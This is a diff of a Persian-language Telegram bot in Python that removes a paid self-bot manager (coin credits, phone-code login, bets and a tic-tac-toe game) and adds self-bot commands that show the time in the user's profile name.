-                InlineKeyboardButton(
-                    "⏹ خاموش کردن سلف",
-                    callback_data="self_stop",
-                    style=KeyboardButtonStyle(bg_danger=True)
-                )
-            ],
-            [
-                InlineKeyboardButton(
-                    "🔄 آپدیت سلف",
-                    callback_data="self_update",
-                    style=KeyboardButtonStyle(bg_primary=True)
-                )
-            ],
-            [
-                InlineKeyboardButton(
-                    "🔙 بازگشت",
-                    callback_data="back",
-                    style=KeyboardButtonStyle(bg_primary=True)
-                )
-            ]
-        ])
-        
-        await safe_edit_message(callback_query.message, 
-            f"⚙️ **مدیریت سلف بات**\n\n"
-            f"📊 **وضعیت فعلی:** {status_text}\n"
-            f"💰 **سکه ها:** `{credits}`\n\n"
-            f"🔹 **روشن کردن:** سلف بات را فعال می‌کند\n"
-            f"🔹 **خاموش کردن:** سلف بات را متوقف می‌کند\n"
-            f"🔹 **آپدیت سلف:** سلف بات را مجدداً راه‌اندازی می‌کند\n\n"
-            f"📱 **شماره:** `{user_data.get('phone', 'ثبت نشده')}`",
-            reply_markup=keyboard
-        )
-        await callback_query.answer()
-    elif data == "self_start":
-        user_data = db.get("users", user_id, {})
-        credits = db.get("credits", user_id, 0)
-        
-        if credits <= 0:
-            await safe_edit_message(callback_query.message, 
-                "❌ **سکه کافی ندارید!**\n\n"
-                f"💰 سکه های شما: `{credits}`\n\n"
-                "💡 لطفا ابتدا موجودی خود را افزایش دهید.",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("💰 افزایش موجودی", callback_data="increase_balance", style=KeyboardButtonStyle(bg_success=True))],
-                    [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management", style=KeyboardButtonStyle(bg_primary=True))]
-                ])
-            )
-            return
-        
-        if not user_data.get('phone'):
-            await safe_edit_message(callback_query.message, 
-                "❌ **شماره تلفن ثبت نشده است!**\n\n"
-                "لطفا ابتدا از طریق دکمه «فعالسازی» شماره خود را ثبت کنید.",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("● فعالسازی ●", callback_data="login", style=KeyboardButtonStyle(bg_success=True))],
-                    [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management", style=KeyboardButtonStyle(bg_primary=True))]
-                ])
-            )
-            return
-        
-        if db.get("processes", user_id):
-            await safe_edit_message(callback_query.message, 
-                "ℹ️ **سلف بات در حال حاضر فعال است!**\n\n"
-                "برای راه‌اندازی مجدد از گزینه «آپدیت سلف» استفاده کنید.",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔄 آپدیت سلف", callback_data="self_update", style=KeyboardButtonStyle(bg_primary=True))],
-                    [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management", style=KeyboardButtonStyle(bg_primary=True))]
-                ])
-            )
-            return
-        
-        if run_selfbot(user_id, user_data.get('phone')):
-            credits = db.get("credits", user_id, 0)
-            await safe_edit_message(callback_query.message, 
-                f"✅ **سلف بات با موفقیت روشن شد!**\n\n"
-                f"💰 **سکه باقی‌مانده:** `{credits}`\n"
-                f"⏰ **زمان باقی‌مانده:** `{credits}` ساعت\n\n"
-                f"📱 **شماره:** `{user_data.get('phone')}`",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔙 بازگشت به مدیریت", callback_data="self_management", style=KeyboardButtonStyle(bg_primary=True))]
-                ])
-            )
-        else:
-            await safe_edit_message(callback_query.message, 
-                "❌ **خطا در روشن کردن سلف بات!**\n\n"
-                "لطفا دوباره تلاش کنید.",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔄 تلاش مجدد", callback_data="self_start", style=KeyboardButtonStyle(bg_success=True))],
-                    [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management", style=KeyboardButtonStyle(bg_primary=True))]
-                ])
-            )
-        await callback_query.answer()
-    elif data in ("self_stop", "stop_self"):
-        if stop_selfbot(user_id):
-            await safe_edit_message(callback_query.message, 
-                "✅ **سلف بات با موفقیت خاموش شد!**\n\n"
-                "برای روشن کردن مجدد از گزینه «روشن کردن سلف» استفاده کنید.",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("▶️ روشن کردن سلف", callback_data="self_start", style=KeyboardButtonStyle(bg_success=True))],
-                    [InlineKeyboardButton("🔙 بازگشت به مدیریت", callback_data="self_management", style=KeyboardButtonStyle(bg_primary=True))]
-                ])
-            )
-        else:
-            await safe_edit_message(callback_query.message, 
-                "ℹ️ **سلف بات در حال حاضر خاموش است!**\n\n"
-                "برای روشن کردن از گزینه «روشن کردن سلف» استفاده کنید.",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("▶️ روشن کردن سلف", callback_data="self_start", style=KeyboardButtonStyle(bg_success=True))],
-                    [InlineKeyboardButton("🔙 بازگشت به مدیریت", callback_data="self_management", style=KeyboardButtonStyle(bg_primary=True))]
-                ])
-            )
-        await callback_query.answer()
-    elif data == "self_update":
-        user_data = db.get("users", user_id, {})
-        credits = db.get("credits", user_id, 0)
-        
-        if credits <= 0:
-            await safe_edit_message(callback_query.message, 
-                "❌ **سکه کافی ندارید!**\n\n"
-                f"💰 سکه های شما: `{credits}`\n\n"
-                "💡 لطفا ابتدا موجودی خود را افزایش دهید.",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("💰 افزایش موجودی", callback_data="increase_balance", style=KeyboardButtonStyle(bg_success=True))],
-                    [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management", style=KeyboardButtonStyle(bg_primary=True))]
-                ])
-            )
-            return
-        
-        if not user_data.get('phone'):
-            await safe_edit_message(callback_query.message, 
-                "❌ **شماره تلفن ثبت نشده است!**\n\n"
-                "لطفا ابتدا از طریق دکمه «فعالسازی» شماره خود را ثبت کنید.",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("● فعالسازی ●", callback_data="login", style=KeyboardButtonStyle(bg_success=True))],
-                    [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management", style=KeyboardButtonStyle(bg_primary=True))]
-                ])
-            )
-            return
-        
-        await safe_edit_message(callback_query.message, 
-            "🔄 **در حال آپدیت سلف بات...**\n\n"
-            "لطفا چند لحظه صبر کنید...",
-            reply_markup=None
-        )
-        
-        stop_selfbot(user_id)
-        await asyncio.sleep(1)
-        
-        if run_selfbot(user_id, user_data.get('phone')):
-            credits = db.get("credits", user_id, 0)
-            await safe_edit_message(callback_query.message, 
-                f"✅ **سلف بات با موفقیت آپدیت شد!**\n\n"
-                f"💰 **سکه باقی‌مانده:** `{credits}`\n"
-                f"⏰ **زمان باقی‌مانده:** `{credits}` ساعت\n\n"
-                f"📱 **شماره:** `{user_data.get('phone')}`",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔙 بازگشت به مدیریت", callback_data="self_management", style=KeyboardButtonStyle(bg_primary=True))]
-                ])
-            )
-        else:
-            await safe_edit_message(callback_query.message, 
-                "❌ **خطا در آپدیت سلف بات!**\n\n"
-                "لطفا دوباره تلاش کنید.",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔄 تلاش مجدد", callback_data="self_update", style=KeyboardButtonStyle(bg_primary=True))],
-                    [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management", style=KeyboardButtonStyle(bg_primary=True))]
-                ])
-            )
-        await callback_query.answer()
-    
-    elif data == "increase_balance":
-        await safe_edit_message(callback_query.message, 
-            "💰 **افزایش موجودی**\n\n"
-            f"💎 **نرخ تبدیل:** هر {COIN_RATE} سکه = 50,000 تومان\n"
-            f"💵 **قیمت هر سکه:** {TOMAN_PER_COIN:.0f} تومان\n\n"
-            "🔢 **تعداد سکه مورد نظر خود را وارد کنید:**\n"
-            "مثال: 1440\n\n"
-            "💡 **توجه:** فقط عدد وارد کنید (بدون نقطه یا کاما)",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back", style=KeyboardButtonStyle(bg_primary=True))]])
-        )
-        db.delete("temp_data", f"waiting_coins_{user_id}")
-        db.set("temp_data", f"waiting_coins_{user_id}", True)
-        await callback_query.answer("✅ لطفا تعداد سکه مورد نظر را وارد کنید")
-
-    elif data == "back":
-        # بازگشت برای همه کاربران، از جمله ادمین، به منوی اصلی عادی انجام می‌شود.
-        credits = db.get("credits", user_id, 0)
-        user_data = db.get("users", user_id, {})
-        
-        status_text = "🔴 سلف غیرفعال"
-        phone_text = ""
-        
-        if user_data and user_data.get('status') == 'active':
-            status_text = "🟢 سلف فعال"
-            phone_text = f"\n📱 شماره: {user_data.get('phone', '')}"
-        
-        keyboard = create_main_menu(user_id)
-        text = (
-            f"🤖 **ربات مدیریت سلف بات**\n\n"
-            f"**وضعیت:** {status_text}{phone_text}\n"
-            f"**💰 سکه ها:** `{credits}` سکه\n"
-            f"**⏰ مصرف:** 1 سکه در ساعت\n"
-            f"{MENU_WIDTH_PAD}"
-        )
-        await safe_edit_message(callback_query.message, text, reply_markup=keyboard)
-        await callback_query.answer()
-    
-    elif data == "check_join":
-        ok, not_joined = await check_force_join(client, user_id)
-        if ok:
-            try:
-                await callback_query.message.delete()
-            except Exception:
-                pass
-            await show_main_menu(client, callback_query.message.chat.id, callback_query.from_user)
-            await callback_query.answer("✅ عضویت تایید شد.")
-            return
-        buttons = []
-        for ch in not_joined:
-            buttons.append([InlineKeyboardButton(f"📢 عضویت در @{ch}", url=f"https://t.me/{ch}")])
-        buttons.append([InlineKeyboardButton("🔄 بررسی مجدد", callback_data="check_join")])
-        await safe_edit_message(callback_query.message, 
-            "❌ هنوز عضو همه کانال‌ها نیستید!",
-            reply_markup=InlineKeyboardMarkup(buttons)
-        )
-        await callback_query.answer()
-@bot.on_message(filters.user(ADMIN_ID) & filters.regex(r'^\d+$'))
-async def handle_admin_input(client, message: Message):
+    action = message.command[1]
     user_id = message.from_user.id
-    amount = int(message.text)
     
-    if db.get("temp_data", f"admin_global_coins_{user_id}"):
-        db.delete("temp_data", f"admin_global_coins_{user_id}")
-        users = db.get_all("users")
-        count = 0
-        for uid in users.keys():
-            uid_int = int(uid)
-            db.set("credits", uid_int, db.get("credits", uid_int, 0) + amount)
-            count += 1
-        await message.reply_text(f"✅ به {count} کاربر، هر کدام {amount:,} الماس اضافه شد.")
-        return
-
-    set_target = db.get("temp_data", f"admin_set_{user_id}")
-    if set_target:
-        db.delete("temp_data", f"admin_set_{user_id}")
-        db.set("credits", set_target, amount)
+    if action == "روشن":
+        user_time_status[user_id] = True
+        user_original_names.setdefault(user_id, message.from_user.first_name or "")
+        success = await update_name_with_time(user_id, client)
         
-        await message.reply_text(f"✅ سکه کاربر {set_target} تنظیم شد به {amount}")
+        if not time_updater_started:  
+            time_updater_started = True  
+            asyncio.create_task(continuous_time_updater(client))
         
-        try:
-            await bot.send_message(set_target, f"🔧 موجودی سکه شما تنظیم شد\n💰 جدید: {amount} سکه")
-        except: pass
-
-# ==============================
-# بازی دوز گروهی (2 نفره)
-# ==============================
-def _ttt_keyboard(game_id, board, enabled=True):
-    cells = []
-    for i, value in enumerate(board):
-        label = value if value in ("❌", "⭕") else "·"
-        cells.append(InlineKeyboardButton(label, callback_data=f"ttt_move_{game_id}_{i}" if enabled and value == " " else "balance_noop"))
-    return InlineKeyboardMarkup([cells[0:3], cells[3:6], cells[6:9]])
-
-def _ttt_winner(board):
-    lines=((0,1,2),(3,4,5),(6,7,8),(0,3,6),(1,4,7),(2,5,8),(0,4,8),(2,4,6))
-    for a,b,c in lines:
-        if board[a] != " " and board[a] == board[b] == board[c]: return board[a]
-    return None
-
-@bot.on_message(filters.group & filters.regex(r'^دوز(?:\s+\d+)?$'))
-async def ttt_create(client, message: Message):
-    gid = f"{message.chat.id}_{message.id}"
-    game={"chat_id":message.chat.id,"creator_id":message.from_user.id,"creator_name":message.from_user.first_name or "کاربر","player2_id":None,"board":[" "]*9,"turn":None,"message_id":None,"finished":False}
-    db.set("tic_tac_toe", gid, game)
-    text=("🎮 <b>بازی دوز</b>\\n\\n"
-          f"👤 سازنده: <b>{html.escape(message.from_user.first_name or 'کاربر')}</b>\\n"
-          "⏳ منتظر یک بازیکن دیگر...\\n\\n"
-          "بازیکن اول: ❌ | بازیکن دوم: ⭕")
-    kb=InlineKeyboardMarkup([[InlineKeyboardButton("🎮 پیوستن به بازی",callback_data=f"ttt_join_{gid}",style=KeyboardButtonStyle(bg_success=True))]])
-    image = db.data.get("bet_doz_image")
-    if image:
-        m=await message.reply_photo(photo=image, caption=text, reply_markup=kb, parse_mode=enums.ParseMode.HTML)
-    else:
-        m=await message.reply_text(text,reply_markup=kb,parse_mode=enums.ParseMode.HTML)
-    game["message_id"]=m.id; db.set("tic_tac_toe",gid,game)
-
-async def handle_ttt_callback(client, q):
-    data=q.data
-    if data.startswith("ttt_join_"):
-        gid=data[len("ttt_join_"):]; g=db.get("tic_tac_toe",gid)
-        if not g or g.get("finished"): await q.answer("بازی در دسترس نیست",show_alert=True); return
-        if q.from_user.id==g["creator_id"]: await q.answer("شما سازنده بازی هستید.",show_alert=True); return
-        if g.get("player2_id"): await q.answer("بازی پر شده است.",show_alert=True); return
-        g["player2_id"]=q.from_user.id; g["player2_name"]=q.from_user.first_name or "کاربر"; g["turn"]=g["creator_id"]; db.set("tic_tac_toe",gid,g)
-        text=("🎮 <b>بازی دوز شروع شد!</b>\\n\\n"
-              f"❌ {html.escape(g['creator_name'])}\\n⭕ {html.escape(g['player2_name'])}\\n\\n"
-              f"نوبت: ❌ {html.escape(g['creator_name'])}")
-        await safe_edit_message(q.message,text,reply_markup=_ttt_keyboard(gid,g["board"]),parse_mode=enums.ParseMode.HTML)
-        await q.answer("به بازی پیوستید!"); return
-    # move format: ttt_move_gid_index ; gid may contain underscores, so rsplit
-    rest=data[len("ttt_move_"):]; gid, idxs=rest.rsplit("_",1); idx=int(idxs); g=db.get("tic_tac_toe",gid)
-    if not g or g.get("finished") or not g.get("player2_id"): await q.answer("بازی فعال نیست.",show_alert=True); return
-    if q.from_user.id!=g["turn"]: await q.answer("نوبت شما نیست!",show_alert=True); return
-    if g["board"][idx] != " ": await q.answer("این خانه پر است.",show_alert=True); return
-    mark="❌" if q.from_user.id==g["creator_id"] else "⭕"; g["board"][idx]=mark
-    winner=_ttt_winner(g["board"])
-    if winner or " " not in g["board"]:
-        g["finished"]=True; db.set("tic_tac_toe",gid,g)
-        if winner:
-            win_id=g["creator_id"] if winner=="❌" else g["player2_id"]; win_name=g["creator_name"] if winner=="❌" else g["player2_name"]
-            text=f"🏆 <b>بازی تمام شد!</b>\\n\\nبرنده: {winner} <b>{html.escape(win_name)}</b> (<code>{win_id}</code>)"
-        else: text="🤝 <b>بازی مساوی شد!</b>"
-        await safe_edit_message(q.message,text,reply_markup=_ttt_keyboard(gid,g["board"],False),parse_mode=enums.ParseMode.HTML); await q.answer(); return
-    g["turn"]=g["player2_id"] if q.from_user.id==g["creator_id"] else g["creator_id"]; db.set("tic_tac_toe",gid,g)
-    turn_name=g["creator_name"] if g["turn"]==g["creator_id"] else g["player2_name"]; turn_mark="❌" if g["turn"]==g["creator_id"] else "⭕"
-    text=("🎮 <b>بازی دوز</b>\\n\\n"
-          f"❌ {html.escape(g['creator_name'])}\\n⭕ {html.escape(g['player2_name'])}\\n\\n"
-          f"نوبت: {turn_mark} <b>{html.escape(turn_name)}</b>")
-    await safe_edit_message(q.message,text,reply_markup=_ttt_keyboard(gid,g["board"]),parse_mode=enums.ParseMode.HTML); await q.answer()
-
-@bot.on_message(filters.command("start"))
-async def start_handler(client, message: Message):
-    # همه کاربران می‌توانند ربات را با /start استفاده کنند.
-    # فقط امکانات مدیریتی همچنان مخصوص ADMIN_ID باقی می‌ماند.
-    ok, not_joined = await check_force_join(client, message.from_user.id)
-    if not ok:
-        buttons = []
-        for ch in not_joined:
-            buttons.append([InlineKeyboardButton(f"📢 عضویت در @{ch}", url=f"https://t.me/{ch}")])
-        buttons.append([InlineKeyboardButton("● بررسی عضویت ●", callback_data="check_join")])
-        await message.reply_text(
-            "❌ برای استفاده از ربات باید در تمام کانال‌های زیر عضو شوید:",
-            reply_markup=InlineKeyboardMarkup(buttons)
-        )
-        return
-
-    # /start همیشه منوی اصلی را باز می‌کند؛ پنل مدیریت فقط با /admin در دسترس است.
-    await show_main_menu(client, message.chat.id, message.from_user)
-@bot.on_callback_query(filters.regex(r'^joinbet_(-?\d+)_(-?\d+)$'))
-async def join_group_bet_handler(client, callback_query):
-    user_id = callback_query.from_user.id
-    user_first_name = html.escape(callback_query.from_user.first_name or 'کاربر')
-    user_mention = f'<a href="tg://user?id={user_id}"><b>{user_first_name}</b></a>'
-    data = callback_query.data
-    _, chat_id_str, msg_id_str = data.split('_')
-
-    chat_id = int(chat_id_str)
-    message_id = int(msg_id_str)
-    bet_key = f"{chat_id}_{message_id}"
-
-    bet_data = db.get("group_bets", bet_key)
-    if not bet_data or not bet_data.get("is_active"):
-        await callback_query.answer("❌ این شرط دیگر فعال نیست.", show_alert=True)
-        return
-
-    if bet_data.get("finished"):
-        await callback_query.answer("❌ این شرط قبلا به پایان رسیده است.", show_alert=True)
-        return
-    if callback_query.message.chat.id != chat_id:
-        await callback_query.answer("❌ این دکمه مخصوص گروه اصلی شرط است.", show_alert=True)
-        return
-
-    creator_id = bet_data["creator_id"]
-    creator_first_name = html.escape(bet_data.get('creator_name', 'کاربر'))
-    creator_mention = f'<a href="tg://user?id={creator_id}"><b>{creator_first_name}</b></a>'
-    participants = bet_data.get("participants", [])
-    if user_id == creator_id:
-        await callback_query.answer("ℹ️ شما سازنده این شرط هستید و قبلاً داخل شرط هستید.", show_alert=True)
-        return
-    if len(participants) >= 1:
-        await callback_query.answer("⛔ ظرفیت این شرط تکمیل شده است.", show_alert=True)
-        return
-
-    if user_id in [p["id"] for p in participants]:
-        await callback_query.answer("ℹ️ شما قبلا در این شرط شرکت کرده‌اید.", show_alert=True)
-        return
-
-    amount = bet_data["amount"]
-    current_credits = db.get("credits", user_id, 0)
-
-    if current_credits < amount:
-        await callback_query.answer(
-            f"❌ سکه کافی ندارید!\n💰 موجودی شما: {current_credits} سکه",
-            show_alert=True
-        )
-        return
-    db.set("credits", user_id, current_credits - amount)
-
-    participants.append({
-        "id": user_id,
-        "name": callback_query.from_user.first_name or "",
-        "username": callback_query.from_user.username or ""
-    })
-    bet_data["participants"] = participants
-    if not bet_data.get("timer_started"):
-        bet_data["timer_started"] = True
-        db.set("group_bets", bet_key, bet_data)
-        asyncio.create_task(finish_group_bet(client, bet_key))
-    else:
-        db.set("group_bets", bet_key, bet_data)
-    try:
-        participants_mentions = []
-        for p in participants:
-            p_name = html.escape(p.get('name', 'کاربر'))
-            participants_mentions.append(f'<a href="tg://user?id={p["id"]}"><b>{p_name}</b></a>')
+        await message.edit("**تایم کنار نام فعال شد**\n**راس هر دقیقه آپدیت می‌شود**" if success else "**خطا در تغییر نام**")
         
-        all_players_mentions = [creator_mention] + participants_mentions
-        
-        new_text = (
-            "🎲 شرط 1v1 در حال اجرا\n\n"
-            f"💰 مبلغ هر نفر: <code>{amount}</code> سکه\n"
-            f"👥 شرکت‌کننده‌ها: <code>{len(participants) + 1}/2</code> نفر\n"
-            f"👤 بازیکنان: {', '.join(all_players_mentions)}\n\n"
-            "⏳ ۵ ثانیه بعد بین این دو نفر قرعه‌کشی می‌شود."
-        )
-        new_keyboard = InlineKeyboardMarkup([
-            [
-                InlineKeyboardButton("✅ پیوستن به شرط", callback_data=f"joinbet_{chat_id}_{message_id}"),
-                InlineKeyboardButton("⛔ لغو شرط", callback_data=f"cancelbet_{chat_id}_{message_id}")
-            ]
-        ])
-        await safe_edit_message(callback_query.message, new_text, reply_markup=new_keyboard, parse_mode=enums.ParseMode.HTML)
-    except Exception as e:
-        print(f"Error updating bet message: {e}")
-
-    await callback_query.answer("✅ در شرط شرکت کردید و سکه از حساب شما کسر شد.")
-@bot.on_callback_query(filters.regex(r'^cancelbet_(-?\d+)_(-?\d+)$'))
-async def cancel_group_bet_handler(client, callback_query):
-    user_id = callback_query.from_user.id
-    user_first_name = html.escape(callback_query.from_user.first_name or 'کاربر')
-    user_mention = f'<a href="tg://user?id={user_id}"><b>{user_first_name}</b></a>'
-    data = callback_query.data
-    _, chat_id_str, msg_id_str = data.split('_')
-
-    chat_id = int(chat_id_str)
-    message_id = int(msg_id_str)
-    bet_key = f"{chat_id}_{message_id}"
-
-    bet_data = db.get("group_bets", bet_key)
-    if not bet_data:
-        await callback_query.answer("❌ این شرط یافت نشد یا قبلا حذف شده.", show_alert=True)
-        return
-
-    creator_id = bet_data["creator_id"]
-    creator_first_name = html.escape(bet_data.get('creator_name', 'کاربر'))
-    creator_mention = f'<a href="tg://user?id={creator_id}"><b>{creator_first_name}</b></a>'
-
-    if user_id != creator_id:
-        await callback_query.answer("❌ فقط سازنده شرط می‌تواند آن را لغو کند.", show_alert=True)
-        return
-
-    if bet_data.get("finished"):
-        await callback_query.answer("❌ این شرط قبلا تمام شده است.", show_alert=True)
-        return
-
-    amount = bet_data["amount"]
-    participants = bet_data.get("participants", [])
-    if not bet_data.get("refunded"):
-        creator_credits = db.get("credits", creator_id, 0)
-        db.set("credits", creator_id, creator_credits + amount)
-        bet_data["refunded"] = True
-    for participant in participants:
-        uid = participant["id"]
-        credits = db.get("credits", uid, 0)
-        db.set("credits", uid, credits + amount)
-
-    bet_data["finished"] = True
-    bet_data["is_active"] = False
-    db.set("group_bets", bet_key, bet_data)
-
-    participants_mentions = []
-    for p in participants:
-        p_name = html.escape(p.get('name', 'کاربر'))
-        participants_mentions.append(f'<a href="tg://user?id={p["id"]}"><b>{p_name}</b></a>')
-    
-    all_users_text = creator_mention
-    if participants_mentions:
-        all_users_text += f", {', '.join(participants_mentions)}"
-
-    text = (
-        "⛔ این شرط توسط سازنده لغو شد.\n\n"
-        f"👤 سازنده: {creator_mention}\n"
-        f"👥 سایر بازیکنان: {', '.join(participants_mentions) if participants_mentions else 'ندارد'}\n"
-        f"💰 مبلغ شرط: <code>{amount}</code> سکه\n"
-        "💸 مبلغ به تمام افراد (سازنده و شرکت‌کننده‌ها) برگشت داده شد."
-    )
-
-    try:
-        await safe_edit_message(callback_query.message, text, reply_markup=None, parse_mode=enums.ParseMode.HTML)
-    except:
-        pass
-
-    await callback_query.answer("✅ شرط با موفقیت لغو شد.", show_alert=True)
-@bot.on_callback_query(filters.regex("check_join"))
-async def check_join(client, callback_query):
-    user_id = callback_query.from_user.id
-    ok, not_joined = await check_force_join(client, user_id)
-
-    if ok:
-        try:
-            await callback_query.message.delete()
-        except Exception:
-            pass
-        await show_main_menu(client, callback_query.message.chat.id, callback_query.from_user)
-        await callback_query.answer("✅ عضویت تایید شد.")
-        return
-
-    buttons = []
-    for ch in not_joined:
-        buttons.append([InlineKeyboardButton(f"📢 عضویت در @{ch}", url=f"https://t.me/{ch}")])
-
-    buttons.append([InlineKeyboardButton("🔄 بررسی مجدد", callback_data="check_join")])
-
-    await safe_edit_message(callback_query.message, 
-        "❌ هنوز عضو همه کانال‌ها نیستید!",
-        reply_markup=InlineKeyboardMarkup(buttons)
-    )
-@bot.on_message(filters.private & filters.regex(r'^\+\d{10,15}$'))
-async def handle_phone(client, message: Message):
-    user_id, phone = message.from_user.id, message.text
-    
-    if user_id in active_clients:
-        try:
-            await active_clients[user_id].disconnect()
-            del active_clients[user_id]
-        except:
-            pass
-    
-    credits = db.get("credits", user_id, 0)
-    if credits <= 0:
-        await message.reply_text(f"❌ سکه کافی ندارید!\nسکه های شما: {credits}")
-        return
-    
-    try:
-        session_name = f"sessions/{user_id}"
-        temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
-        await temp_client.connect()
-        
-        active_clients[user_id] = temp_client
-        sent_code = await temp_client.send_code(phone)
-        user_data = db.get("users", user_id, {})
-        user_data["phone"] = phone
-        db.set("users", user_id, user_data)
-        await message.reply_text(
-            "✅ **کد تأیید ارسال شد**\n\n"
-            "🔢 **کد ۵ رقمی را با دکمه‌های زیر وارد کنید:**\n\n"
-            f"<b><code>{format_code_display('')}</code></b>\n\n"
-            "📱 کد ارسال شده به شماره شما",
-            reply_markup=create_numpad_keyboard(),
-            parse_mode=enums.ParseMode.HTML
-        )
-        
-        db.set("temp_data", user_id, {
-            "phone": phone, 
-            "phone_code_hash": sent_code.phone_code_hash,
-            "client_active": True
-        })
-        
-    except Exception as e:
-        await message.reply_text(f"❌ **خطا:** {str(e)}")
-        if user_id in active_clients:
+    elif action == "خاموش":
+        user_time_status[user_id] = False
+        if user_id in user_original_names:
             try:
-                await active_clients[user_id].disconnect()
-                del active_clients[user_id]
-            except:
-                pass
-@bot.on_message(filters.private & filters.text)
-async def handle_all_messages(client, message: Message):
-    user_id = message.from_user.id
-    text = message.text
-    if db.get("temp_data", f"waiting_coins_{user_id}"):
-        try:
-            coins_amount = int(text)
-            if coins_amount <= 0:
-                await message.reply_text("❌ تعداد سکه باید بیشتر از صفر باشد")
-                return
-            
-            toman_amount = coins_amount * TOMAN_PER_COIN
-            
-            payment_data = {
-                "user_id": user_id,
-                "coins": coins_amount,
-                "toman": toman_amount,
-                "timestamp": time.time(),
-                "status": "pending",
-                "first_name": message.from_user.first_name or "",
-                "username": message.from_user.username or ""
-            }
-            
-            db.set("payments", user_id, payment_data)
-            db.delete("temp_data", f"waiting_coins_{user_id}")
-            
-            payment_text = (
-                f"💳 **برای پرداخت لطفا مبلغ {toman_amount:,.0f} تومان به حساب زیر واریز کنید:**\n\n"
-                f"🏦 **بانک:** {card_info['bank_name']}\n"
-                f"🔢 **شماره کارت:** `{card_info['card_number']}`\n"
-                f"👤 **به نام:** {card_info['card_owner']}\n\n"
-                f"💎 **تعداد سکه دریافتی:** {coins_amount} سکه\n\n"
-                f"📸 **پس از واریز، رسید یا عکس پرداخت را ارسال کنید**\n"
-                f"⏰ پرداخت شما حداکثر تا 24 ساعت بررسی خواهد شد"
-            )
-            
-            keyboard = InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 انصراف", callback_data="increase_balance")]
-            ])
-            
-            await message.reply_text(payment_text, reply_markup=keyboard)
-            db.set("temp_data", f"waiting_payment_proof_{user_id}", True)
-            
-        except ValueError:
-            await message.reply_text("❌ لطفا یک عدد معتبر وارد کنید")
-        return
-
-    temp_data = db.get("temp_data", user_id)
-    if temp_data and temp_data.get("needs_password"):
-        try:
-            if user_id not in active_clients:
-                await message.reply_text("❌ کلاینت فعال نیست. لطفا دوباره شماره را ارسال کنید.")
-                return
-            
-            user_client = active_clients[user_id]
-            await user_client.check_password(text)
-            
-            user_info = {
-                "phone": temp_data["phone"],
-                "status": "active",
-                "created_at": time.time(),
-                "last_active": time.time(),
-                }
-            db.set("users", user_id, user_info)
-            db.delete("temp_data", user_id)
-            
-            if user_id in active_clients:
-                try:
-                    await active_clients[user_id].disconnect()
-                    del active_clients[user_id]
-                except:
-                    pass
-            
-            if run_selfbot(user_id, temp_data["phone"]):
-                credits = db.get("credits", user_id, 0)
-                await message.reply_text(
-                    f"✅ **سلف بات فعال شد!**\n\n"
-                    f"💰 سکه های شما: {credits}\n"
-                    f"⏰ زمان باقی‌مانده: {credits} ساعت"
-                )
-            else: 
-                await message.reply_text("❌ خطا در اجرای سلف")
-            
-        except Exception as e: 
-            await message.reply_text(f"❌ رمز اشتباه: {str(e)}")
-        return
-
-    if user_id == ADMIN_ID:
-        set_target = db.get("temp_data", f"admin_set_{user_id}")
-        if set_target and text.isdigit():
-            amount = int(text)
-            db.delete("temp_data", f"admin_set_{user_id}")
-            db.set("credits", set_target, amount)
-            
-            await message.reply_text(f"✅ سکه کاربر {set_target} تنظیم شد به {amount}")
-            
-            try:
-                await bot.send_message(set_target, f"🔧 موجودی سکه شما تنظیم شد\n💰 جدید: {amount} سکه")
+                await client.update_profile(first_name=user_original_names[user_id])
+                await message.edit("**تایم کنار نام غیرفعال شد**\nنام شما به حالت اول بازگشت")
             except: 
-                pass
-            return
+                await message.edit("❌ خطا در بازگردانی نام")
+        else: 
+            await message.edit("✅ تایم کنار نام غیرفعال شد")
+    else:
+        await message.edit("⚠️ **استفاده:**\n`تایم روشن` - فعال کردن\n`تایم خاموش` - غیرفعال کردن")
+
+@app.on_message(filters.me & filters.command("لیست فونت", prefixes=""))
+async def font_list_command(client: Client, message: Message):
+    sample_time = "12:34"
+    fonts_samples = "\n".join([f"**فونت {i}:** {''.join([FONTS[i].get(char, char) for char in sample_time])}" for i in range(1, 7)])
+    await message.edit(f"🔤 **لیست فونت‌های زمان**\n\n{fonts_samples}\n\n**استفاده:**\n`تنظیم فونت 1` تا `تنظیم فونت 6`")
+
+@app.on_message(filters.me & filters.command("تنظیم فونت", prefixes=""))
+async def set_font_command(client: Client, message: Message):
+    if len(message.command) < 2: 
+        return await message.edit("⚠️ **استفاده:**\n`تنظیم فونت 1` تا `تنظیم فونت 6`")
     
-    pass
-@bot.on_message(filters.photo & filters.private)
-async def handle_card_photo(client, message: Message):
-    user_id = message.from_user.id
-    
-    if db.get("temp_data", f"waiting_payment_proof_{user_id}"):
-        payment_data = db.get("payments", user_id)
-        if not payment_data:
-            await message.reply_text("❌ اطلاعات پرداخت یافت نشد. لطفا دوباره تلاش کنید.")
+    try:
+        font_num = int(message.command[1])
+        if 1 <= font_num <= 6:
+            user_fonts["me"] = font_num
+            if user_time_status.get(message.from_user.id, False): 
+                await update_name_with_time(message.from_user.id, client)
+            await message.edit(f"✅ **فونت زمان به شماره {font_num} تغییر کرد**\n\nنمونه: {get_iran_time()}")
+        else: 
+            await message.edit("❌ **شماره فونت باید بین 1 تا 6 باشد**")
+    except ValueError: 
+        await message.reply("❌ **لطفا یک عدد وارد کنید**\nمثال: `تنظیم فونت 2`")
+
